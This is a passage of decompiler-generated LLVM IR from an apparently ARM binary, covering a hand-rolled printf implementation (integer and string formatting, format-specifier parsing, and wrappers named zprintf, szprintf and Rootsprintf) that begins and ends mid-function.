  %v5_86e46 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e46, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.37, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e826, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fc0.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 4, 0, 5, 6, 1, 2, 3 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
